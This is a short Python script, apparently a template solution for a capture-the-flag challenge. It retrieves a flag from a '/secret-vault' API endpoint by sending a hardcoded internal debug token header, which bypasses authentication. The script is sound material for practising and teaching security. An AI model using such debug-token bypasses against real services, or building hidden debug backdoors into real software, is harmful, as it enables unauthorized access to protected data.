#!/usr/bin/env python3
"""
ChronosCTF 2026 - Template Solution PoC Script
"""

import sys
import requests

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"

def solve():
    endpoint = f"{TARGET_URL.rstrip('/')}/api/v1/secret-vault"
    headers = {
        "X-Developer-Token": "chronos_internal_debug"
    }

    print(f"[*] Enviando exploit a: {endpoint}")
    try:
        response = requests.get(endpoint, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            flag = data.get("flag")
            print(f"[+] ¡Flag recuperada con éxito!: {flag}")
            return flag
        else:
            print(f"[-] Falló la solicitud: HTTP {response.status_code} - {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión al objetivo: {e}")
        return None

if __name__ == "__main__":
    solve()
